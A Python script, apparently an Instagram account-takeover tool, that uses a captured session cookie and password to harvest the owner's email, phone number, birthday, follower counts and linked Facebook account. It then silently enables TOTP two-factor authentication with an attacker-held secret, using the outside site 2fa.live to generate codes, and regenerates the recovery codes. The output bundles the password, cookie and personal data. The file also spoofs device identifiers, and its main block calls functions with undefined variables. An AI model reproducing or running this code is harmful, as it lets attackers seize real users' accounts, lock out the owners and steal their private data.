"""JANGAN DI UBAH²"""
import base64, json, random, time, hashlib, uuid, requests, os, re, json, string
ses = requests.Session()

def get_requests_data(req):
	return {
		"av": re.search('"actorID":"(.*?)"', str(req)).group(1),
		"__user": "0",
		"__a": "1",
		"__req": "l",
		"__hs": re.search('"haste_session":"(.*?)"', str(req)).group(1),
		"dpr": "3",
		"__ccg": "UNKNOWN",
		"__rev": re.search('"__spin_r":(.*?),', str(req)).group(1),
		"__s": "",
		"__hsi": re.search('"hsi":"(.*?)"', str(req)).group(1),
		"__dyn": "",
		"__csr": "",
		"__comet_req": "29",
		"fb_dtsg": re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}', str(req)).group(1),
		"jazoest": re.search('jazoest=(.*?)"', str(req)).group(1),
		"lsd": re.search('"LSD",\[\],{"token":"(.*?)"}', str(req)).group(1),
		"__spin_r": re.search('"__spin_r":(.*?),', str(req)).group(1),
		"__spin_b": "trunk",
		"__spin_t": re.search('"__spin_t":(.*?),', str(req)).group(1),
	}
	
def data_graph(req):
    data = {
        'av': re.search(r'{"actorID":"(\d+)"', str(req)).group(1),
        '__d': 'www',
        '__user': '0',
        '__a': '1',
        '__req': 'h',
        '__hs': re.search(r'"haste_session":"(.*?)"', str(req)).group(1),
        'dpr': '2',
        '__ccg': 'GOOD',
        '__rev': re.search(r'{"consistency":{"rev":(\d+)}', str(req)).group(1),
        '__s': '',
        '__hsi': re.search(r'"hsi":"(\d+)"', str(req)).group(1),
        '__dyn': '',
        '__csr': '',
        '__comet_req': re.search(r'__comet_req=(\d+)', str(req)).group(1),
        'fb_dtsg': re.search(r'"DTSGInitialData",\[\],{"token":"(.*?)"}', str(req)).group(1),
        'jazoest': re.search(r'jazoest=(\d+)', str(req)).group(1),
        'lsd': re.search(r'"LSD",\[\],{"token":"(.*?)"', str(req)).group(1),
        '__spin_r': re.search(r'"__spin_r":(\d+)', str(req)).group(1),
        '__spin_b': 'trunk',
        '__spin_t': re.search(r'"__spin_t":(\d+)', str(req)).group(1),
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
        'server_timestamps': 'true',
        'doc_id': '6888165191230459'
    }
    return data

def headers_facebook(req):
    headers = {
        'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
        'x-ig-app-id': '1217981644879628',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-lsd': re.search(r'"LSD",\[\],{"token":"(.*?)"', str(req)).group(1),
        'accept': '*/*',
    }
    return headers
    
def headers_common():
    return {
        'x-ig-app-locale': 'in_ID',
        'x-ig-device-locale': 'in_ID',
        'x-ig-mapped-locale': 'id_ID',
        'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
        'x-bloks-is-layout-rtl': 'false',
        'x-ig-capabilities': '3brTv10=',
        'x-ig-app-id': '567067343352427',
        'priority': 'u=3',
        'user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)',
        'accept-language': 'id-ID, en-US',
        'x-fb-http-engine': 'Liger',
        'x-fb-client-ip': 'True',
        'x-fb-server-cluster': 'True'
    }
    
def data_target_process_account(name, cookies, password):
    headers_profile = headers_common()
    headers_profile.update({
        'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; D2105 Build/20.0.B.0.74) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Instagram 37.0.0.21.97 Android (18/4.3; 240dpi; 480x744; Sony; D2105; D2105; qcom; ru_RU; 98288237)'
    })

    fol, low = None, None
    info_email, info_nomor_hp, info_birthday = None, None, None
    id, fb_name = None, None
    nomer, email = None, None

    for username in name.split(','):
        try:
            profile_response = requests.get(
                f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}', 
                headers=headers_profile
            )
            profile_response.raise_for_status()
            profil_info_target = profile_response.json().get('data', {}).get('user', {})
            fol = profil_info_target.get("edge_followed_by", {}).get("count")
            low = profil_info_target.get("edge_follow", {}).get("count")
        except requests.RequestException:
            fol, low = None, None

    try:
        account_response = requests.get(
            'https://i.instagram.com/api/v1/accounts/current_user/', 
            params={'edit': 'true'}, 
            cookies={'cookie': cookies}, 
            headers=headers_common()
        )
        account_response.raise_for_status()
        info = account_response.json().get('user', {})
        info_email = info.get('email')
        info_nomor_hp = info.get('phone_number')
        info_birthday = info.get('birthday')
    except requests.RequestException:
        info_email, info_nomor_hp, info_birthday = None, None, None

    try:
        fb_response = requests.get(
            'https://i.instagram.com/api/v1/ig_fb_xposting/account_linking/user_xposting_destination/', 
            headers=headers_common(), 
            cookies={'cookie': cookies}, 
            data={'signed_body': 'SIGNATURE.{}'}
        )
        fb_response.raise_for_status()
        req = fb_response.json().get('linked_fb_user', {})
        id = req.get('id')
        fb_name = req.get('name')
    except requests.RequestException:
        id, fb_name = None, None

    try:
        response = requests.get(
            'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', 
            cookies={'cookie': cookies}
        )
        response.raise_for_status()
        resp_text = response.text
        head = headers_facebook(resp_text)
        head.update({
            'Host': 'accountscenter.instagram.com',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            'x-fb-friendly-name': 'FXAccountsCenterContactPointRootQuery'
        })
        data = data_graph(resp_text)
        data.update({
            'fb_api_req_friendly_name': 'FXAccountsCenterContactPointRootQuery',
            'variables': json.dumps({"interface": "IG_WEB"}),
            'doc_id': '6253939098058154'
        })
        reqs = requests.post(
            'https://accountscenter.instagram.com/api/graphql/', 
            data=data, headers=head, cookies={'cookie': cookies}
        ).text
        
        if '"all_contact_points"' in str(reqs):
            nomer_search = re.search(r'{"contact_point_type":"PHONE_NUMBER","normalized_contact_point":"(.*?)"', str(reqs))
            email_search = re.search(r'{"contact_point_type":"EMAIL","normalized_contact_point":"(.*?)"', str(reqs))
            if nomer_search:
                nomer = nomer_search.group(1)
            if email_search:
                email = email_search.group(1)
    except requests.RequestException:
        nomer, email = None, None

    result_dict = {
    	"Username": username,
    	"Password": password,
        "Followers": fol,
        "Following": low,
        "contacts": f'{nomer or "Tidak tersedia"}|{email or "Tidak tersedia"}',
        "Birthday": info_birthday or "Tidak tersedia",
        "facebook acc": f'{id or "Tidak tersedia"}|{fb_name or "Tidak tersedia"}',
        "authorization": cookies,
    }
    result_string = "\n".join([f'"{key}": "{value}"' for key, value in result_dict.items()])
    
    return result_string
    

from urllib.parse import quote_plus

def xor_encrypt_decrypt(data: str, key: str) -> str:
    def generate_extended_key(data_len: int, key: str) -> str:
        return key * (data_len // len(key) + 1)

    extended_key = generate_extended_key(len(data), key)
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, extended_key))

def custom_encrypt(data: str, key: str) -> str:
    def base64_encode_reverse(data: str) -> str:
        return base64.b64encode(data.encode()).decode()[::-1]

    xor_result = xor_encrypt_decrypt(data, key)
    reversed_encoded = base64_encode_reverse(xor_result)
    padded_encoded = reversed_encoded + '=='[:len(reversed_encoded) % 4]
    return padded_encoded

def custom_decrypt(data: str, key: str) -> str:
    def base64_decode_reverse(data: str) -> str:
        return base64.b64decode(data[::-1]).decode()

    unpadded_data = data.rstrip('=')
    reversed_encoded = base64_decode_reverse(unpadded_data)
    return xor_encrypt_decrypt(reversed_encoded, key)

def complex_transform(data: str) -> str:
    def encode_json(data: str) -> str:
        return json.dumps(data)

    def hex_encode(data: str) -> str:
        return data.encode().hex()

    json_encoded = encode_json(data)
    hex_encoded = hex_encode(json_encoded)
    reversed_hex = hex_encoded[::-1]
    return reversed_hex

def inverse_complex_transform(data: str) -> str:
    def decode_hex(data: str) -> bytes:
        return bytes.fromhex(data[::-1])

    def decode_json(data: bytes) -> str:
        return json.loads(data.decode())

    hex_encoded = data
    json_encoded = decode_hex(hex_encoded)
    return decode_json(json_encoded)

def generate_unique_id() -> str:
    raw_id = hashlib.sha256(str(time.time() + random.random()).encode()).hexdigest()[:32]
    formatted_id = f"{raw_id[:8]}-{raw_id[8:12]}-{raw_id[12:16]}-{raw_id[16:20]}-{raw_id[20:]}"
    return formatted_id

def generate_uuid_with_format() -> str:
    raw_id = hashlib.sha256(str(time.time() + random.random()).encode()).hexdigest()[:32]
    formatted_id = f"{raw_id[:8]}-{raw_id[8:12]}-{raw_id[12:16]}-{raw_id[16:20]}-{raw_id[20:]}"
    return formatted_id

def generate_device_id() -> str:
    return "android-" + hashlib.sha512(str(time.time()).encode()).hexdigest()[:16]
    
def generate_instagram_request_data(prefix='', suffix='') -> dict:
    def read_user_agents(file_path: str) -> list:
        with open(file_path, "r") as file:
            return file.read().splitlines()

    def get_random_string(length: int) -> str:
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))

    agents = read_user_agents("UserAgent.txt")
    transformed_agents = [custom_encrypt(complex_transform(agent), 'complex_key') for agent in agents]
    selected_agent = random.choice(transformed_agents)
    user = inverse_complex_transform(custom_decrypt(selected_agent, 'complex_key')).split(",")

    xor_key = get_random_string(32)
    encoded_agent_string = ','.join(user)
    cipher_text = xor_encrypt_decrypt(encoded_agent_string, xor_key)    
    api_url = "https://i.instagram.com/api/v1/accounts/login"
    response = requests.get(api_url)
    mid = response.cookies.get("mid", get_random_string(25))
    
    timestamp = time.time()
    device_id = f"android-{hashlib.sha512(str(timestamp).encode()).hexdigest()[:16]}"
    obfuscated_prefix = get_random_string(12)
    obfuscated_suffix = get_random_string(12)
    
    uuid_value = generate_uuid_with_format()
    device_id = generate_device_id()
    family_device_id = generate_unique_id()
    waterfall_id = generate_unique_id()
    
    versions = ["250.0.0.21.109", "240.2.0.18.107", "242.0.0.16.111"]
    kode = random.choice(["378116721", "381185720", "394071277"])
    version = random.choice(versions) 
    
    tt = random.choice(['ginkgo', 'mango', 'dragon', 'odin', 'falcon', 'vortex', 'titan', 'phoenix'])
    af = random.choice(['qcom', 'mtk', 'exynos', 'apple', 'intel'])
    useragent_api = f'Instagram 309.1.0.41.113 Android ({user[7]}/{user[6]}; {user[5]}dpi; {user[4]}; {user[0]}; {user[1]}; {user[2]}; {user[3]}; id_ID; {user[9]})'
    useragent_threads = f'Barcelona 289.0.0.77.109 Android ({user[7]}/{user[6]}; {user[5]}dpi; {user[4]}; {user[0]}; {user[1]}; {user[2]}; {user[3]}; id_ID; {user[9]})'

    data = {
        "useragent_api": useragent_api,
        "useragent_threads": useragent_threads,
        "mid": mid,
        "uuid": uuid_value,
        "device_id": device_id,
        "waterfall_id": waterfall_id,
        "family_device_id": family_device_id,
    }
    
    combined_data = json.dumps(data, separators=(',', ':'))
    encrypted_data = custom_encrypt(complex_transform(combined_data), xor_key)

    return {
        "encrypted_data": encrypted_data,
        "xor_key": xor_key
    }

def decrypt_instagram_request_data(encrypted_data: str, xor_key: str) -> dict:
    decrypted_data = inverse_complex_transform(custom_decrypt(encrypted_data, xor_key))
    return json.loads(decrypted_data)
    
generated_data = generate_instagram_request_data()
encrypted_data = generated_data["encrypted_data"]
xor_key = generated_data["xor_key"]

def generate_ids():
    CONFIG = {
        'api_url': 'https://i.instagram.com/api/v1/accounts/login',
        'android_id_prefix': 'android-',
        'android_id_length': 16
    }
    
    session = requests.Session()
    response = session.get(CONFIG['api_url'])
    mid = response.cookies.get("mid")
    
    if not mid:
        us1 = ''.join(random.choice('QWERTYUIOPASDFGHJKLZXCVBNM') for _ in range(8))
        mid = f'Y4nS4g{us1}zwIrWdeYLcD9Shxj'
    
    adid = str(uuid.uuid4())
    water = str(uuid.uuid4())
    device_id = str(uuid.uuid4())
    family_id = str(uuid.uuid4())
    hash_digest = hashlib.sha256(str(time.time()).encode()).hexdigest()
    android_id = f"{CONFIG['android_id_prefix']}{hash_digest[:CONFIG['android_id_length']]}"
    
    return {
        'adid': adid,
        'water': water,
        'x_mid': mid,
        'device_id': device_id,
        'family_id': family_id,
        'android_id': android_id
    }

def Clear(): os.system('cls' if os.name == 'nt' else 'clear')

def set_authentication(cookie):
    info = on_authen_a2f(cookie)
    if info.get('success-a2f'):
        key = info.get('SecretKey', 'null')
        recovery_code = info.get('recovery-code', 'null')
        return {
            'active': True,
            'key': key,
            'recovery-code': recovery_code
        }
    else:
        return {
            'active': False,
            'key': 'null',
            'recovery-code': 'null'
        }

def on_authen_a2f(cokie, url='https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point'):
    info = {}
    try:
        resp = requests.get(url, cookies={'cookie': cokie}).text
        head = headers_graph(resp)
        head.update({
            'Host': 'accountscenter.instagram.com',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
            'x-fb-friendly-name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"', str(resp)).group(1),
            'x-ig-app-id': '1217981644879628',
        })
        data = data_graph(resp)
        data.update({
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'useFXSettingsTwoFactorGenerateTOTPKeyMutation',
            'variables': json.dumps({"input": {"client_mutation_id": f"{client_id(resp)}", "actor_id": f"{account_id(resp)}", "account_id": f"{account_id(resp)}", "account_type": "INSTAGRAM", "device_id": "device_id_fetch_ig_did", "fdid": "device_id_fetch_ig_did"}}),
            'doc_id': '6282672078501565',
        })
        get_p = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie': cokie}).text
        if "totp_key" in str(get_p):
            xnxx = re.search('"key_text":"(.*?)"', str(get_p)).group(1)
            hpsx = xnxx.replace(' ', '')
            kode = requests.get(f'https://2fa.live/tok/{hpsx}').json()['token']
            info.update({'SecretKey': hpsx})
            aktifkan_a2f(cokie, kode, resp, hpsx, info)
        else:
            info.update({'SecretKey': 'Tidak Ada'})
            info.update({'success-a2f': False})
            info.update({'recovery-code': 'Tidak Ada'})
    except Exception:
        info.update({'SecretKey': 'Tidak Ada'})
        info.update({'success-a2f': False})
        info.update({'recovery-code': 'Tidak Ada'})
    return info

def aktifkan_a2f(cokie, code, resp, auth, info):
    try:
        xxx = resp
        ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'
        head = {
            'Host': 'accountscenter.instagram.com',
            'x-ig-app-id': '1217981644879628',
            'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"', str(resp)).group(1),
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'no-cors',
            'sec-fetch-dest': 'empty',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'x-fb-friendly-name': 'useFXSettingsTwoFactorEnableTOTPMutation',
        }
        data = {'av': account_id(resp), '__user': '0', '__a': '1', '__req': '14', '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1), 'dpr': '2', '__ccg': 'GOOD', '__rev': re.search('{"rev":(.*?)}', str(xxx)).group(1), '__hsi': re.findall('"hsi":"(\d+)"', str(xxx))[0], '__comet_req': '24', 'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}', str(xxx)).group(1), 'jazoest': re.findall('&jazoest=(\d+)', str(xxx))[0], 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"', str(xxx)).group(1), '__spin_r': re.findall('"__spin_r":(\d+)', str(xxx))[0], '__spin_b': 'trunk', '__spin_t': re.findall('"__spin_t":(\d+)', str(xxx))[0], 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'useFXSettingsTwoFactorEnableTOTPMutation', 'variables': json.dumps({"input": {"client_mutation_id": re.search('{"clientID":"(.*?)"}', str(resp)).group(1), "actor_id": re.findall('"actorID":"(\d+)"', str(resp))[0], "account_id": re.findall('"actorID":"(\d+)"', str(resp))[0], "account_type": "INSTAGRAM", "verification_code": code, "device_id": "device_id_fetch_ig_did", "fdid": "device_id_fetch_ig_did"}}), 'server_timestamps': 'true', 'doc_id': '7032881846733167'}
        ondw = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie': cokie}).text
        if '"success":true' in str(ondw):
            info.update({'success-a2f': True})
            data.update({'fb_api_req_friendly_name': 'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation', 'variables': json.dumps({"input": {"client_mutation_id": re.search('{"clientID":"(.*?)"}', str(resp)).group(1), "actor_id": re.findall('"actorID":"(\d+)"', str(resp))[0], "account_id": re.findall('"actorID":"(\d+)"', str(resp))[0], "account_type": "INSTAGRAM", "fdid": "device_id_fetch_ig_did"}}), 'doc_id': '24010978991879298'})
            head.update({'x-fb-friendly-name': 'useFXSettingsTwoFactorRegenerateRecoveryCodesMutation'})
            reco = requests.post('https://accountscenter.instagram.com/api/graphql/', data=data, headers=head, cookies={'cookie': cokie}).text
            if '"success":true' in str(reco):
                kode = re.search('"recovery_codes":(.*?)}', str(reco)).group(1)
                info.update({'recovery-code': kode})
            else:
                info.update({'recovery-code': 'null'})
        else:
            info.update({'success-a2f': False})
            info.update({'recovery-code': 'null'})
    except Exception as e:
        print(e)
        info.update({'success-a2f': False})
        info.update({'recovery-code': 'null'})

def data_graph(xxx):
    data = {
        'av': re.search('{"actorID":"(\d+)"', str(xxx)).group(1),
        '__d': 'www',
        '__user': '0',
        '__a': '1',
        '__req': 'h',
        '__hs': re.search('"haste_session":"(.*?)"', str(xxx)).group(1),
        'dpr': '2',
        '__ccg': 'GOOD',
        '__rev': re.search('{"consistency":{"rev":(\d+)}', str(xxx)).group(1),
        '__s': '',
        '__hsi': re.search('"hsi":"(\d+)"', str(xxx)).group(1),
        '__dyn': '',
        '__csr': '',
        '__comet_req': re.search('__comet_req=(\d+)', str(xxx)).group(1),
        'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"}', str(xxx)).group(1),
        'jazoest': re.search('jazoest=(\d+)', str(xxx)).group(1),
        'lsd': re.search('"LSD",\[\],{"token":"(.*?)"', str(xxx)).group(1),
        '__spin_r': re.search('"__spin_r":(\d+)', str(xxx)).group(1),
        '__spin_b': 'trunk',
        '__spin_t': re.search('"__spin_t":(\d+)', str(xxx)).group(1),
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'PolarisPostCommentsContainerQuery',
        'server_timestamps': 'true',
        'doc_id': '6888165191230459'
    }
    return data

def headers_graph(xxx):
    headers = {
        'x-fb-friendly-name': 'PolarisPostCommentsContainerQuery',
        'x-ig-app-id': '1217981644879628',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'x-fb-lsd': re.search('"LSD",\[\],{"token":"(.*?)"', str(xxx)).group(1),
        'accept': '*/*',
    }
    return headers

def client_id(xxx):
    try:
        client = re.search('{"clientID":"(.*?)"}', str(xxx)).group(1)
        return client
    except AttributeError:
        return ''
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return client_id(xxx)

def account_id(xxx):
    try:
        userid = re.search('{"actorID":"(\d+)"', str(xxx)).group(1)
        return userid
    except AttributeError:
        return ''
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return account_id(xxx)

if __name__ == '__main__':
	Clear()
	set_authentication(cookie)
	generate_ids()
	decrypt_instagram_request_data(encrypted_data, xor_key)
	data_target_process_account(name, cookies, password)
	get_requests_data(req)
